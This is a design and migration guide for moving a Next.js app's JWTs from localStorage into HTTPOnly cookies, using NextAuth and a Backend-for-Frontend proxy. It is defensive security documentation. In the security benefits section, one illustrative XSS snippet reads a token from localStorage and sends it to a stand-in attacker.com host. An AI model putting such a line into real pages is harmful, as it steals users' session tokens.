# HTTPOnly Cookies + BFF Authentication Architecture

## Overview

This implementation replaces client-side JWT storage (localStorage) with a production-grade security model using:

1. **HTTPOnly Cookies**: JWT tokens stored in secure, browser-managed cookies
2. **BFF (Backend For Frontend)**: Proxy layer that adds authentication headers
3. **NextAuth.js**: Centralized session management with multiple OAuth providers
4. **Server-Side Sessions**: All authentication state managed on server

## Architecture

```
┌──────────────┐
│   Browser    │
│  (React App) │
└──────┬───────┘
       │ HTTP Request with Cookies
       ▼
┌──────────────────────────────────┐
│     Next.js Frontend + NextAuth   │
│     - /app/login                  │
│     - /app/api/auth/[...nextauth] │ (Session manager)
│     - /app/api/proxy              │ (BFF layer)
└──────┬───────────────────────────┘
       │ HTTP Request with Auth Header
       │ (BFF adds JWT from session)
       ▼
┌──────────────────────────────────┐
│  Backend Services                │
│  - /auth/login                   │
│  - /auth/register                │
│  - /auth/oauth/google            │
│  - /auth/refresh                 │
│  - Other protected endpoints     │
└──────────────────────────────────┘
```

## File Changes

### 1. NextAuth Configuration
**File**: `/app/api/auth/[...nextauth]/route.ts`

- **Credentials Provider**: Handles email/password login
  - Calls backend `/auth/login`
  - Receives `accessToken` + `refreshToken`
  - Stores in NextAuth session (server-side)

- **Google OAuth Provider**: Handles "Sign in with Google"
  - Redirects to Google consent screen
  - Receives `idToken` from Google
  - Sends `idToken` to backend `/auth/oauth/google`
  - Backend exchanges for platform JWT
  - Stores in NextAuth session

- **HTTPOnly Cookie Configuration**:
  ```typescript
  cookies: {
    sessionToken: {
      name: `${useSecureCookies ? '__Secure-' : ''}next-auth.session-token`,
      options: {
        httpOnly: true,           // XSS protection
        secure: useSecureCookies, // HTTPS only in production
        sameSite: 'lax',          // CSRF protection
        maxAge: 30 * 24 * 60 * 60, // 30 days
      },
    },
  }
  ```

- **Session Callback**: Stores JWT in session for BFF access
  ```typescript
  session({ session, token }) {
    (session as any).accessToken = (token as any).accessToken
    (session as any).refreshToken = (token as any).refreshToken
    return session
  }
  ```

### 2. BFF Proxy Routes
**Files**: 
- `/app/api/proxy/route.ts` (handles `/api/proxy/*`)
- `/app/api/proxy/[...path]/route.ts` (dynamic routing)

**What it does**:
1. Intercepts all frontend API requests to `/api/proxy/*`
2. Calls `getServerSession()` to get authenticated session
3. Extracts `accessToken` from session
4. Adds `Authorization: Bearer {token}` header
5. Forwards request to backend
6. Returns backend response to frontend

**Example flow**:
```
Frontend: GET /api/proxy/user/profile
   ↓
BFF: Extracts JWT from session
BFF: GET http://localhost:3001/user/profile
     Headers: Authorization: Bearer eyJhbG...
   ↓
Backend: Returns user data
   ↓
Frontend: Receives user data
```

### 3. API Client Configuration
**File**: `/lib/api.ts`

Changes:
- **baseURL**: `/api/proxy` (not direct backend)
- **withCredentials**: `true` (sends HTTPOnly cookies)
- **Token functions**: Deprecated (return null)
- **Error handling**: 401 redirects to `/login`

Old flow:
```
Frontend → stores JWT in localStorage
         → axios adds JWT header manually
         → calls backend directly
         → XSS can steal token from localStorage
```

New flow:
```
Frontend → browser stores JWT in HTTPOnly cookie
         → browser sends cookie automatically
         → calls BFF proxy
         → BFF adds Authorization header (server-side)
         → calls backend
         → XSS cannot access token
```

### 4. Login Page Refactor
**File**: `/app/login/page.tsx`

Changes:
- Removed manual `authApi.login()` calls
- Uses `signIn('credentials')` for email/password
- Uses `signIn('google')` for Google OAuth
- Both routes handled by NextAuth Credentials/Google providers
- Removed useAuthStore dependency (no longer needed)

## Security Benefits

### 1. XSS Protection (HTTPOnly Cookies)
- **Before**: localStorage vulnerable to JavaScript injection
  ```javascript
  // XSS attacker can do this:
  const token = localStorage.getItem('token');
  fetch('https://attacker.com?token=' + token);
  ```

- **After**: HTTPOnly cookie protected
  ```javascript
  // XSS attacker CANNOT access HTTPOnly cookie
  console.log(document.cookie); // No JWT visible
  // Browser still sends cookie automatically, but JavaScript can't read it
  ```

### 2. CSRF Protection (SameSite Cookie)
- Cookie sent only for same-site requests
- Prevents cross-site form submissions from stealing authentication
- SameSite=Lax allows normal navigation (user clicks link)

### 3. HTTPS Enforcement (Secure Flag)
- Secure flag ensures cookie only sent over HTTPS
- Prevents man-in-the-middle attacks
- Enabled in production

### 4. Session Isolation
- All authentication state on server (NextAuth session)
- Client never handles raw JWT
- Token refresh done server-side before token expires

## Environment Variables Required

```bash
# NextAuth Configuration
NEXTAUTH_URL=http://localhost:3010           # Frontend URL
NEXTAUTH_SECRET=your-random-secret-key-here  # Session encryption

# Google OAuth (Optional)
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret

# Backend URL (used by BFF proxy)
NEXT_PUBLIC_API_URL=http://localhost:3001
```

## Testing the Authentication Flow

### 1. Email/Password Login
```bash
curl -X POST http://localhost:3010/api/auth/callback/credentials \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "password": "TestPass123!"}'
```

### 2. Check Session (Server-side only)
```typescript
import { getServerSession } from 'next-auth/next'

const session = await getServerSession()
console.log(session?.accessToken) // JWT from session
```

### 3. Make API Request Through BFF
```bash
curl -X GET http://localhost:3010/api/proxy/user/profile \
  --cookie "__Secure-next-auth.session-token=..." 
```

### 4. Verify HTTPOnly Cookie
1. Open browser DevTools (F12)
2. Go to Application → Cookies
3. Look for `__Secure-next-auth.session-token` or `next-auth.session-token`
4. Verify:
   - ✓ HttpOnly: checked
   - ✓ Secure: checked (in production)
   - ✓ SameSite: Lax
   - ✓ Domain: localhost
   - ✓ Path: /

## Troubleshooting

### Issue: "NEXTAUTH_URL not set"
- **Fix**: Add NEXTAUTH_URL to .env.local
  ```bash
  NEXTAUTH_URL=http://localhost:3010
  ```

### Issue: "NEXTAUTH_SECRET not set"
- **Fix**: Add NEXTAUTH_SECRET to .env.local
  ```bash
  NEXTAUTH_SECRET=$(openssl rand -base64 32)
  ```

### Issue: Backend returns 401 Unauthorized
- **Cause**: BFF proxy JWT not included or expired
- **Fix**: 
  1. Check NextAuth session exists: `console.log(session)`
  2. Check backend expects Bearer token format
  3. Verify token not expired

### Issue: Cookie not being sent to backend
- **Cause**: CORS or credentials issue
- **Fix**:
  1. Ensure backend CORS allows credentials
  2. Verify axios has `withCredentials: true`
  3. Check cookie domain matches

### Issue: "XSS Attack" warning in production
- **Cause**: Forgot to set HTTPS
- **Fix**: Deploy with HTTPS, update NEXTAUTH_URL to https://...

## Migration from localStorage

If updating existing code that uses localStorage:

1. **Remove token management**:
   ```diff
   - const token = localStorage.getItem('token')
   - headers['Authorization'] = `Bearer ${token}`
   + // BFF proxy handles this now
   ```

2. **Update API client baseURL**:
   ```diff
   - baseURL: 'http://localhost:3001'
   + baseURL: '/api/proxy'
   ```

3. **Use NextAuth for auth state**:
   ```diff
   - const { user } = useAuthStore()
   + const { data: session } = useSession()
   ```

4. **Use signIn/signOut**:
   ```diff
   - await authApi.login(email, password)
   + await signIn('credentials', { email, password })
   
   - localStorage.clear()
   + await signOut()
   ```

## Next Steps

1. **Test end-to-end**:
   - Register new user via `/register`
   - Login via email/password
   - Verify API requests work through BFF
   - Check HTTPOnly cookies in DevTools
   - Test logout

2. **Enable Google OAuth**:
   - Add GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET
   - Test "Sign in with Google" button
   - Verify backend `/auth/oauth/google` endpoint working

3. **Production deployment**:
   - Update NEXTAUTH_URL to production domain
   - Set NEXTAUTH_SECRET to random value
   - Enable HTTPS
   - Configure backend CORS for production domain
   - Test cookie transmission over HTTPS

4. **Monitor and maintain**:
   - Log authentication errors
   - Monitor session expiry and refresh
   - Track failed login attempts (rate limiting)
   - Regularly rotate NEXTAUTH_SECRET

## References

- [NextAuth.js Docs](https://next-auth.js.org/)
- [HTTPOnly Cookies Security](https://owasp.org/www-community/attacks/xss/)
- [SameSite Cookie Attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [BFF Pattern](https://auth0.com/blog/backend-for-frontend-pattern-with-oidc-and-oauth2/)
